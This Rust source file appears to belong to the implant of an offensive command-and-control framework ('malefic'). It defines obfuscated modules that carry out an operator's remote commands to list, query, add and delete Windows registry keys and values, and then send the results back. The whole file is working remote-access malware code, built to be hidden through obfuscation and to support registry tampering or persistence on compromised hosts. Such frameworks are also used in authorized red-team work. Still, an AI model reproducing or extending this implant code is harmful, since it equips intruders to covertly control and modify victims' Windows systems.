use crate::prelude::*;
use malefic_os_win::reg::{RegistryKey, RegistryValue};

pub struct RegListKey {}

#[async_trait]
#[module_impl("reg_list_key")]
impl Module for RegListKey {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for RegListKey {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        // Allow path to be empty for querying root directory
        let path = if req.path.is_empty() { "" } else { &req.path };

        let reg_key = RegistryKey::open(hive.parse()?, path)?;
        let res = reg_key.list_subkeys()?;
        let mut resp = malefic_proto::proto::modulepb::Response::default();
        resp.array = res;
        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

pub struct RegListValue {}
#[async_trait]
#[module_impl("reg_list_value")]
impl Module for RegListValue {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for RegListValue {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        // Allow path to be empty for querying root directory
        let path = if req.path.is_empty() { "" } else { &req.path };

        let reg_key = RegistryKey::open(hive.parse()?, path)?;
        let res = reg_key.list_values()?;

        let mut resp = malefic_proto::proto::modulepb::Response::default();
        for (key, value) in res {
            resp.kv.insert(key, value.to_string());
        }

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

pub struct RegQuery {}
#[async_trait]
#[module_impl("reg_query")]
impl Module for RegQuery {}
#[async_trait]
#[obfuscate]
impl ModuleImpl for RegQuery {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        let path = check_field!(req.path)?;
        let key = check_field!(req.key)?;

        let reg_key = RegistryKey::open(hive.parse()?, &path)?;
        let value = reg_key.query_value(&key)?;

        let mut resp = malefic_proto::proto::modulepb::Response::default();
        resp.output = value.to_string();

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

pub struct RegAdd {}
#[async_trait]
#[module_impl("reg_add")]
impl Module for RegAdd {}
#[async_trait]
#[obfuscate]
impl ModuleImpl for RegAdd {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::RegistryWriteRequest)?;
        let hive = check_field!(req.hive)?;
        let path = check_field!(req.path)?;

        let reg_key = match RegistryKey::open(hive.parse()?, &*path) {
            Ok(key) => key,
            Err(_) => RegistryKey::create(hive.parse()?, &*path)?,
        };

        let key = if req.key.is_empty() {
            return Ok(TaskResult::new(id));
        } else {
            check_field!(req.key)?
        };

        // Set different types of values based on regtype
        match req.regtype {
            1 => {
                // REG_SZ
                let string_value = check_field!(req.string_value)?;
                reg_key.set_value(&*key, RegistryValue::String(string_value))?;
            }
            3 => {
                // REG_BINARY
                let byte_value = check_field!(req.byte_value)?;
                to_error!(reg_key.set_value(&*key, RegistryValue::Binary(byte_value.to_vec())))?;
            }
            4 => {
                // REG_DWORD
                let dword_value = req.dword_value;
                reg_key.set_value(&*key, RegistryValue::Dword(dword_value))?;
            }
            11 => {
                // REG_QWORD
                let qword_value = req.qword_value;
                reg_key.set_value(&*key, RegistryValue::Qword(qword_value))?;
            }
            0 => {
                return Ok(TaskResult::new(id));
            }
            _ => return Err(anyhow::Error::msg("Unsupported registry value type").into()),
        }

        Ok(TaskResult::new(id))
    }
}

pub struct RegDelete {}

#[async_trait]
#[module_impl("reg_delete")]
impl Module for RegDelete {}
#[async_trait]
#[obfuscate]
impl ModuleImpl for RegDelete {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        let parsed_hive = hive.parse()?;

        // If key is empty, delete entire key path; otherwise only delete specified value
        if req.key.is_empty() {
            let path = check_field!(req.path)?;
            let (parent_path, subkey_name) = match path.rsplit_once('\\') {
                Some((parent, child)) if !child.is_empty() => (parent, child),
                _ => ("", path.as_str()),
            };

            let parent = RegistryKey::open(parsed_hive, parent_path)?;
            parent.delete_key(Some(subkey_name))?;
        } else {
            // Delete specified value
            let path = if req.path.is_empty() { "" } else { &req.path };
            let reg_key = RegistryKey::open(parsed_hive, path)?;
            reg_key.delete_value(&req.key)?;
        }

        Ok(TaskResult::new(id))
    }
}
